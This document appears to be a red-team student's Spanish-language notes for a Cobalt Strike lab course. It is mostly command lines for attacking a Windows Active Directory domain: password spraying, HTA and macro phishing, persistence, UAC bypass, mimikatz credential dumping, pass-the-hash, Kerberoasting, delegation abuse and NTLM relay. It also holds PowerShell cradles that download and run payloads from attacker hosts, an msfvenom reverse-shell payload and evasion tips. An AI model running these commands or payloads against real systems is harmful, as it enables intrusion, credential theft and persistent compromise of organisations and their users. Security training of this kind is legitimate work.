#¿Qué es un RED TEAM?
Red Teaming es el proceso de usar tácticas, técnicas y procedimientos (TTP) para emular una amenaza del mundo real, con el objetivo de medir 
la efectividad de las personas, los procesos y las tecnologías utilizadas para defender un medio ambiente.
No se puede subestimar lo importante que es planificar adecuadamente 
el compromiso del equipo rojo, no solo para lograr buenos resultados, sino para garantizar que todos los involucrados estén protegidos

#¿Qué es OPSEC?
Es un término acuñado originalmente por el ejército de los EE. UU. Y adoptado por la comunidad de seguridad de la información.
Generalmente se usa para describir la "facilidad" con la que las acciones pueden ser observadas por la inteligencia del "enemigo".

#Engagement - Reglas
Definir los objetivos del compromiso.
Defina el (los) objetivo (s) del compromiso, incluidos los dominios y los rangos de IP.
Identifique los requisitos y / o restricciones legales o reglamentarios.
Contiene listas de contactos de emergencia para personas clave en todas las partes.

#CobalStrike
./teamserver ip Password
bash init.sh

#OPSEC-1
OPSEC : Team Server permite que varios clientes se conecten al mismo tiempo.
No exponer el puerto 50050 directamente a Internet. 
En su lugar, se debe utilizar una solución segura de acceso remoto (como un túnel VPN o SSH).

#Listener Management
New Listener
HTTP
SMB
TCP

#Payload
Attack Packages WindowsExecutables(S)
X64
Save

#OPSEC-2
Las cargas útiles por etapas son buenas si su método de entrega limita la cantidad de datos que puede enviar.
Sin embargo, tienden a tener más indicadores en comparación con los sin etapas. Si tienes la opción, ve sin escenario.

#Interacting with Beacon
Intercart
help
help argue
sleep 10

#OPSEC-3
OPSEC : Los tiempos de check-in rápidos pueden aumentar la posibilidad de que se detecte el tráfico de la baliza. 
También puede agregar un jitter para aleatorizar el tiempo de registro en un porcentaje determinado.

inject 1234 x64 http-80

#DNS RECORDS
dig dominio +short
whois ip
dnscan
spoofcheck

#SocialMeida
site:"linkedin.com" empresa

#PasswordSpraying
MailSniper.ps1 Office 365
Invoke-DomainHarvestOWA -ExchHostname ip
namemash.py 
Invoke-UsernameHarvestOWA -ExchHostname ip -Domain Netbios -UserList .\possible-usernames.txt -OutFile valid.txt
Invoke-PasswordSprayOWA -ExchHostname ip -UserList .\valid.txt -Password Summer2021
Get-GlobalAddressList -ExchHostname IP -UserName netbios\iyates -Password Summer2021 -OutFile gal.txt

#OPSEC-4
En el mundo real, tenga en cuenta que estos intentos de autenticación pueden contar para la política de bloqueo de dominio para los usuarios. 
Demasiados intentos en un corto espacio de tiempo no solo son ruidosos, sino que también pueden bloquear las cuentas.

#HTA
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
------------------------------------
Cobal-Attack-Webdrive-by-Scripted Web Delivery (s)
copi to calc
shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://ip/h'))"""
------------------------------------
#MACRO
Sub AutoOpen()
  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"
End Sub

#Phish de HTA
Atacck-Web-drive by -FileHost

#Recon
Setabelt
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user

#Screenshots
screenshot
View > Screenshots

#KeyLogger
keylogger
ViewLogger

#Jobs
jobs
jobkill 1

#HostPersistence
Autorunciones de registro HKCU / HKLM
Tareas programadas
Carpeta de inicio
execute-assembly sharpersist
--------------------------------------
Tareas Programadas Task
Windows
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://ip/payload"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==

Linux
root @ kali: ~ # str = 'IEX ((new-object net.webclient) .downloadstring ("http://ip/payload"))' 
root @ kali: ~ # echo -en $ str | iconv -t UTF-16LE | base 64 -w 0 
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA ==

execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
-------------------------------------
Start Folder
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
C:\Users\bfarmer\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
-------------------------------------
Ejecución automática del registo
HKCU HKLM
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

COM Hijacking
procmon64.exe
En lugar de secuestrar objetos COM que están en uso y romper
aplicaciones que dependen de ellos, una estrategia más segura es
encontrar instancias de aplicaciones que intentan cargar objetos que en realidad no existe
Oleview.net
Permite la intercomunicación entre componentes de software de diferentes lenguajes
HKEY_ CLASSES_ ROOT\CLSID y HKEY_ CLASSES_ ROOT\Interface
HKEY_ CURRENT_ USER\ Software\Classes
OPeraciones RegOpenKey
NAME NOT FOUND InprocServer32
HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
Get-ChildItem -Path "Registry::HKCR\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

OTRA FORMAS
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
---------
#DLL
Attack Windowx Executable(s) Windows DLL

#EscaladePrivilegios
execute-assembly C:\SharpUp

#Cobal TCP-SMB
Create a New Listener TCP o SMB - Create beacon.exe TCP o SMB
netstat -anp tcp
Pivoting
jump
spawn
spawnas
inject
---
connect localhost 4444
getuid
link localhost 
unlink

#Windows Service
services.msc
sc query
Get-Service | f1

#OPSEC-4
Restaure la configuración del servicio una vez que haya terminado.

#Unquoted Service Paths
run wmic service get name, pathname
powershell Get-Acl -Path "C:\Program Files\Vuln Services" | fl
Los Beacon en escaladas de privilegios mejor por TCP recordar upload 
run sc qc Vuln-Service-1
run sc stop Vuln-Service-1
run sc start Vuln-Service-1
run netstat -anp tcp
connect localhost 4444

#Weak Service Permissions
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
powershell-import C:\Tools\Get-ServiceAcl.ps1 "este"
powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expand Access
run sc config Vuln-Service-2 binPath= C:\Temp\beacon-tcp-svc.exe
run sc qc Vuln-Service-2
run sc stop Vuln-Service-2
run sc start Vuln-Service-2
connect localhost 1337

#Weak Service Binary Permissions
Los usuarios pueden modificar el servicio3.exe
powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
download Service 3.exe
upload C:\Payloads\Service 3.exe
could not upload file: 32
net helmsg 32
run sc stop Vuln-Service-3
upload C:\Payloads\Service 3.exe
run sc start Vuln-Service-3
connect localhost 4444
beacon por TCP si es para escalada de privilegios

#Alwayd Installed Elevated
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
instalador MSI
upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
run msiexec /i BeaconInstaller.msi /q /n
connect localhost 4444

#UAC Bypass
elevate
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe [*] In medium integrity but user is a local administrator- UAC can be bypassed.
elevate uac-token-duplication tcp-4444-local
runasadmin
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://ip:port/b'))"
connect localhost 4444
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe TokenPrivileges
elevate svc-exe tcp-4444-local

#Domain Reconnaissance
#POWERVIEW
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powershell Get-Domain
powershell Get-DomainController | select Forest, Name, OSVersion | fl
powershell Get-ForestDomain
powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess
powershell Get-DomainUser -Identity user -Properties DisplayName, MemberOf | fl
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl
powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
powershell Get-DomainOU -Properties Name | sort -Property Name "controladores de dominios . servidores , estaciones de trabajo"
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName miembros de un grupo especifico
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName
powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
powershell Find-DomainUserLocation | select UserName, SessionFromName
powershell Get-NetSession -ComputerName dc-2 | select CName, UserName
powershell Get-DomainTrust

execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"

#BloodHound
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c DcOnly -d cyberbotic.io
download file.zip
ver descargar view downloads
SPN
MATCH (u:User {hasspn:true}) RETURN u
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p

#LATERAL MOVEMENT
jump
jump winrm64 srv-1 smb

remote-exec
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADEAMwAxADAALwAnACkA

#PowerShell Remoting
remote-exec winrm srv-1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture

#PsExec
SCM copia un archivo y lo ejecuta atraves del SCM
jump psexec64 srv-1 smb
psexec_psh no copia un binario en el destino, sino que usa el SCM para ejecutar una línea única de PowerShell, y siempre será de 32 bits
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAA[...snip...]MLAAA="));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

#WMI
Evento WmiPrvSE
uplaod smb.exe
remote-exec wmi srv-1 smb.exe
link srv-1
ojo cuando se utiliza una vez la siguiente mejor utilizar
#CoInitializeSecurity
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv-2 command="C:\Windows\System32\calc.exe"

#DCOM
powershell-import C:\Tools\Invoke-DCOM.ps1
powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe "dificil de detecta ya que genera un hijo system32/mmc.exe
link srv-1

#IMPERSONATION
net logons usuarios conectados
ps

#LOGONPASSWORDS
Deshabilitando wdigest para evitar tokens
mimikatz sekurlsa::logonpasswords
mimikatz sekurlsa::ekeys

#OPSEC-5 una gran cantidad de técnicas comerciales que aprovechan NTLM no son deseables.Recomendado usar SHA256

mimikatz sekurlsa::ekeys  ((descarga aes256)) vuelva las claves de cifrado de Kerberos.
tomar los campos aes256_hmac y aes128_hmac para overpass the hash

#Security Account Manager extraer los hash NTLM --base de datos del administrador de cuentas--
mimikatz lsadump::sam

#Domain Cachec Credentials
Las credenciales en caché de dominio se diseñaron para instancias en las que se requieren credenciales de dominio para iniciar sesión en una máquina.
mimikatz lsadump::cache
hay que romperalas porque el formato no es NTLM
$DCC2$<iterations>#<username>#<hash>

#Make Token no requiere ser administrador local
make_token ACC\Users password
rev2self

#OPSEC
4624: An account was successfully logged on
source = "WinEventLog: Security" EventCode = 4624 Logon_Type = 9

#Process Injection
ps
inject 3320 x64 tcp-4444-local

#Token Impersonation
ps
steal_token 3320 proceso
rev2self

#SpawnAs
spawnas DEV\user password tcp-4444-local

#OPSEC
4624: An account was successfully logged on
LOGON32_LOGON_INTERACTIVE
Proccess Create 1

#PassTheHash
Realiza una sesion con un NTLM
Parchea LSASS requiere privilegios administrador local
pth DEV\user ntlm
lo carga autmaaticamente
ls \\maquina\c$
pth .\Administrator b423cdd3ad21718de4490d9344afef72

mimikatz
privilege::debug
sekurlsa::pth /user:nlamb /domain:dev.cyberbotic.io /ntlm: /run:"C:\windows\system32\cmd.exe"
runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"


#OPSEC
sysmon cmd.exe
source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="*\\\\.\\pipe\\*"
Computadora: wkstn-1.dev.cyberbotic.io 
LogonId: 0xe6d64 
Imagen principal: C: \ Windows \ System32 \ rundll32.exe 
Usuario: NT AUTHORITY \ SYSTEM
source = "WinEventLog: Security" EventCode = 4624 0xe6d64

para evitar \pipe\ hacerlo manualmente
mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
crear un proceso
powershell -w hidden
atachearse a este
steal_token 6284
al terminar rev2self kill
rev3self
kill 6284

#OVERPASS THE HASH
Se realice a través de Kerberos en lugar de NTLM o AES
Solicita un TGT para el usuario que queremos suplantar.
Cree una sesión de inicio de sesión de sacrificio.
Pase el TGT a esa sesión de inicio de sesión.
Accede al recurso de destino.
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:user /domain:dev.dominio /rc4:ntlm /nowrap

#OPSEC
source = "WinEventLog: Security" EventCode = 4768 Ticket_Encryption_Type = 0x17

PEDIRLO SIN PREVIA AUTENTICACION
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:user /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec
run klists
pillar el id 0:0x1f253
ahora con una contraseña ficticia hacemos una nueva sesion
make_token CER\User passwordmal
run klist
Tickets(0)
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
getuid

modo acortado
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
steal_token 3044
ls \\maquina\c$
----------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------
#Extraccion Tickets Kerberos
En lugar de usar el hash NTLM o las claves AES para solicitar un TGT para el usuario, en realidad podemos extraer sus TGT directamente de la memoria si están conectados a una máquina que controlamos
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
mejor que sea elevado sino solo muestra tickets de sesion de inicio
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
steal_token 4872
tambien sirve para TGS

#Password
Hashcat 
John
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -m 1000 NTLM
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt D:\Tools\rockyou.txt -r rules\add-year.rule

#Session Passing
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
Crear oyente HTTP
spawn metasploit

otra
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.120 LPORT=8080 -f raw -o /tmp/msf.bin
execute C:\Windows\System32\notepad.exe
shinject 1492 x64 C:\Payloads\msf.bin

al reves
Attacks > Packages > Windows Executable (S) Raw Output x64
post/windows/manage/shellcode_inject
use post/windows/manage/shellcode_inject
 
#Socks Proxies
socks 1080
ss -lpnt
proxychains  sock4 127.0.0.1 localhost
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
proxychains python3 /usr/local/bin/wmiexec.py CEV/user@ip
#WindowsApps
#Broweser sock proxy
#Metasploit
setg Proxies socks4:ip:1080
#runas
runas /netonly /user:DEV\nlamb "C:\windows\system32\mmc.exe"

#Reverse Port Forward
$endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any, 4444)
$listener = New-Object System.Net.Sockets.TcpListener $endpoint
$listener.Start()
Write-Host "Listening on port 4444"
while ($true)
{
  $client = $listener.AcceptTcpClient()
  Write-Host "A client has connected"
  $client.Close()
}

nativo
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.14.55 connectport=4444 protocol=tcp
netsh interface portproxy show v4tov4
Test-NetConnection -ComputerName 10.10.17.71 -Port 4444 
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
listenaddress es la dirección IP para escuchar (probablemente siempre 0.0.0.0).
listenport es el puerto para escuchar.
connectaddress es la dirección IP de destino.
connectport es el puerto de destino.
protocolo a utilizar (siempre TCP).

#Rportfwd
rportfwd 8080 10.10.5.120 80
run netstat -anp tcp
iwr -Uri http://10.10.17.231:8080/a
rportfwd stop 8080
No necesita ser un administrador local para crear reenvíos de puertos inversos en puertos altos.

#rportfwd_local
python3 -m http.server --bind 127.0.0.1 8080 
rportfwd_local 8080 127.0.0.1 8080 
iwr -Uri http://machine:8080/test.txt
python3 -m http.server --bind 127.0.0.1 8080

#NTLM Relaying
El cliente realiza una solicitud de autenticación a un servidor para un recurso al que desea acceder.
El servidor envía un desafío al cliente: el cliente debe cifrar el desafío utilizando el hash de su contraseña.
El cliente envía la respuesta cifrada al servidor, que se pone en contacto con un controlador de dominio para verificar que el desafío cifrado sea correcto.
https://github.com/praetorian-inc/PortBender
PortBender.cna
7-pth .\Administrator b423cdd3ad21718de4490d9344afef72
6-upload c:\users\administrator\Desktop\pwn.lnk
5-PortBender redirect 445 8445
4- Upload WinDivert64.sys c:\windows\system32
3-rportfwd 8445 127.0.0.1 445
2-socks 1080 
1-proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://ip -smb2support --no-http-server --no-wcf-server
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'

jump psexec64 srv-2 smb
jobs
jobkill 1

#OPSEC
source = "XmlWinEventLog: Microsoft-Windows-Sysmon / Operational" EventID = 6 Signature! = "Amazon Web Services, Inc."

#FORCE NTLM
<img src="\\10.10.17.231\test.ico" height="1" width="1" />

#WindowsShorcuts
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.17.231\test.ico"
$shortcut.Save()

#DAPI
Guarda datos credenciales RDP

#Credential Manager
run vaultcmd /listcreds:"Windows Credentials" /all
mimikatz vault::list
mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
···incompleto

#GoogleChrome
ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default
execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

#Kerberos
mensaje AS-REQ al Centro de distribución de claves (KDC), también conocido como Controlador de dominio, solicitando un TGT
el KDC verifica le devuelve el TGT en AS-REP ENCRIPTADO CON LA CABLE del KDC
luego solicita un TGS tgs -req
el KDC se lo devuelve TGS-REP

#Kerberoasting
SPN se utilizan con Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión y se configuran en el objeto de usuario en AD
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap

#opsec-6
señuelo y pillado 
source = "WinEventLog: Security" EventCode = 4769
source = "WinEventLog: Security" EventCode = 4769 Service_Name = "svc_honey"
mejor
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
MATCH (u:User {hasspn:true}) RETURN u
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
john --format=krb5tgs --wordlist=wordlist svc_mssql
$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$6A9E[blah]

#ASREPROasting
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
BloodHound
MATCH (u:User {dontreqpreauth:true}) RETURN u
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:svc_oracle /nowrap
john --format=krb5asrep --wordlist=wordlist svc_oracle
hascat -a 0 -m 18200 svc_oracle wordlist

#UnConstrained Delegation
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
powershell Get-DomainComputer -Unconstrained -Properties SamAccountName
jump psexec64 srv-1 smb
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:user /interval:10
make_token DEV\nlamb FakePass
[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
kerberos_ticket_use C:\ticket
 
#PrinterBug
Si la maquina B se configura sin restrincciones nos permitiar captar el TGT de la maquina A
srv1
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe monitor /targetuser:DC-2$ /interval:10 /nowrap
wkstin-1
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe dc-2 srv-1
make_token DEV\DC-2$ FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\dc-2.kirbi
dcsync dev.cyberbotic.io DEV\krbtgt

#Constrained Delegation
Le permite pedir un TGS para otro usuario con su propio TGT
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
BloodHound
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
srv2
mimikatz sekurlsa::ekeys
execute-assembly c:\Rubeus.exe triage 
execute-assembly c:\Rubeus.exe dmp /luid:0x3e4 /service:krgtgt /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/wkstn-2.dev.cyberbotic.io /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
make_token DEV\nlamb Fake
kerberos_ticket_use ticket.kirbi

#AlternateServiceName
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
tgt
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /ticket:ticket /norwap
[System.IO.File]::WriteAllBytes("c:\ticket", [Sytem:Convert]::FromBase64String("pegar el tickekt sin espaciols"))
make_token DEV\nlamb Fake
kerberos_ticket_use c:\ticket.kirbi

#LinuxCredentialCache
sh 10.10.17.12:22 svc_oracle Passw0rd!
ls -l /tmp/
sudo -l
sudo -i
sudo chmod 777 ticket
impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
proxychains scp root@maquina:/loquequiero .
make_token DEV\jking FakePass
kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi

#GPO
WriteProperty , WriteDacl o WriteOwner
La directiva de grupo es el repositorio central de un bosque o dominio que controla la configuración de equipos y usuarios. 
Los objetos de directiva de grupo (GPO) son conjuntos de configuraciones que se aplican a las unidades organizativas (OU). 
A todos los usuarios u ordenadores que sean miembros de la unidad organizativa se les aplicarán esas configuraciones.
Crear GPO
Modificar GPO existentes
Vincular GPO a OU
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName
powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p

